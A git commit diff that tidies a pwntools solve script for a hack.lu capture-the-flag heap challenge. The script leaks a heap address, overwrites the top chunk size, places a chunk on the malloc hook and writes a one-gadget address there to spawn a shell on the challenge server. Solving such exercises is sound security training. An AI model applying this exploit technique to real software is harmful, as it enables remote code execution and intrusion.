4fbb11b6b729efdc14c318da2249c2b7e3282312
Kristoffer Longva Eriksen <kriloneri@gmail.com>
2023-10-15 23:46:32 +0200

    prettier hacklu house

--- hacklu/pwn/house/solve.py
+++ hacklu/pwn/house/solve.py
@@ -4,12 +4,10 @@ from pwn import *
 
 exe = ELF("./new_house")
 libc = ELF("./libc.so.6")
-
 context.binary = exe
 
 # p = process("./new_house")
 # gdb.attach(p)
-
 p = remote("flu.xxx", 10170)
 
 p.recvuntil(b"interesting in the ground: ")
@@ -21,66 +19,43 @@ log.success(f"{hex(libc.address)=}")
 log.success(f"{hex(one_gadget_empty_rsp30)=}")
 log.success(f"{hex(malloc_hook)=}")
 
-p.recvuntil(b">>> ")
-p.sendline(b"1")
-p.recvuntil(b"roomname? ")
-p.sendline(b"A"*16)
-p.recvuntil(b"roomsize? ")
-p.sendline(str(0x100).encode())
+def create_room(name, size):
+    p.recvuntil(b">>> ")
+    p.sendline(b"1")
+    p.recvuntil(b"roomname? ")
+    p.sendline(name.encode())
+    p.recvuntil(b"roomsize? ")
+    p.sendline(str(size).encode())
 
-p.recvuntil(b">>> ")
+def edit_room(number, payload):
+    p.recvuntil(b">>> ")
+    p.sendline(b"3")
+    p.recvuntil(b"roomnumber? ")
+    p.sendline(str(number).encode())
+    p.recvuntil(b"What goes into the room? ")
+    p.sendline(payload)
+
+create_room("A"*16, 0x100)
+
+p.recvuntil(b">>> ") # leak heap
 p.sendline(b"4")
 p.recvuntil(b"A"*16)
 heap_leak = u64(p.recvline()[:4].ljust(8,b"\x00"))
 log.success(f"{hex(heap_leak)=}")
 
-p.recvuntil(b">>> ")
+p.recvuntil(b">>> ") # free first chunk
 p.sendline(b"2")
 p.recvuntil(b"roomnumber? ")
 p.sendline(b"0")
 
-p.recvuntil(b">>> ")
-p.sendline(b"1")
-p.recvuntil(b"roomname? ")
-p.sendline(b"B"*4)
-p.recvuntil(b"roomsize? ")
-p.sendline(str(0x10).encode())
-
-p.recvuntil(b">>> ")
-p.sendline(b"3")
-p.recvuntil(b"roomnumber? ")
-p.sendline(b"0")
-p.recvuntil(b"What goes into the room? ")
-p.sendline(b"B"*24 + b"\xff"*8) # set top chunk size to 0xffffffff
+create_room("B"*4, 0x10)
+edit_room(0, b"B"*24 + b"\xff"*8) # overwrite top chunk header
 
 distance = malloc_hook - heap_leak - 0x30
 
-p.recvuntil(b">>> ")
-p.sendline(b"1")
-p.recvuntil(b"roomname? ")
-p.sendline(b"C"*4)
-p.recvuntil(b"roomsize? ")
-p.sendline(str(distance).encode())
-
-p.recvuntil(b">>> ") # returns pointer to malloc hook
-p.sendline(b"1")
-p.recvuntil(b"roomname? ")
-p.sendline(b"D"*4)
-p.recvuntil(b"roomsize? ")
-p.sendline(str(0x10).encode())
-
-p.recvuntil(b">>> ")
-p.sendline(b"3")
-p.recvuntil(b"roomnumber? ")
-p.sendline(b"3")
-p.recvuntil(b"What goes into the room? ")
-p.sendline(p64(one_gadget_empty_rsp30))
-
-p.recvuntil(b">>> ") # call malloc hook
-p.sendline(b"1")
-p.recvuntil(b"roomname? ")
-p.sendline(b"C"*4)
-p.recvuntil(b"roomsize? ")
-p.sendline(str(distance).encode())
+create_room("C"*4, distance)
+create_room("D"*4, 0x10) # returns pointer to malloc hook
+edit_room(3, p64(one_gadget_empty_rsp30)) # overwrite malloc hook with onegadget
+create_room("E"*4, 0x10)
 
 p.interactive()
